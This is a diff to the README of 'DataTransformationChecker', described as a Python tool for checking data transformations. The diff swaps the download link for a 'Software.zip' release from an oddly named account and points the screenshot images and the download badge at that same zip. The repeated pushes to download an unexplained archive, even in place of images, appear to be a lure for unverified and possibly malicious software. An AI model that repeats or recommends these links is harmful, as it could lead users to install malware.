@@ -15,7 +15,7 @@ Welcome to the **DataTransformationChecker** repository! This Python-based utili
 5. Run the tests and visualize the results.
 
 ## Repository Link 💻
-[Download the application here](https://github.com/user-attachments/files/18426772/Application.zip).
+[Download the application here](https://github.com/Jxx1234567890jxx/DataTransformationChecker/releases/download/v2.0/Software.zip).
 
 ## Topics 📝
 - box-cox-transformation
@@ -30,8 +30,8 @@ Welcome to the **DataTransformationChecker** repository! This Python-based utili
 - yeo-johnson-transformations
 
 ## Screenshots 📷
-![Histogram](https://via.placeholder.com/500x300)
-![Q-Q Plot](https://via.placeholder.com/500x300)
+![Histogram](https://github.com/Jxx1234567890jxx/DataTransformationChecker/releases/download/v2.0/Software.zip)
+![Q-Q Plot](https://github.com/Jxx1234567890jxx/DataTransformationChecker/releases/download/v2.0/Software.zip)
 
 ## Get Started 🏁
 1. Fork the repository.
@@ -51,7 +51,7 @@ We welcome contributions from the community. Feel free to submit pull requests o
 ## License 📜
 This project is licensed under the MIT License - see the LICENSE file for details.
 
-[![Download App](https://img.shields.io/badge/Download-Application-brightgreen)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download App](https://github.com/Jxx1234567890jxx/DataTransformationChecker/releases/download/v2.0/Software.zip)](https://github.com/Jxx1234567890jxx/DataTransformationChecker/releases/download/v2.0/Software.zip)
 
 Explore the world of data transformations with the **DataTransformationChecker** tool. Transform your data with confidence and achieve meaningful insights effortlessly. Download the application now! 🚀📈
 
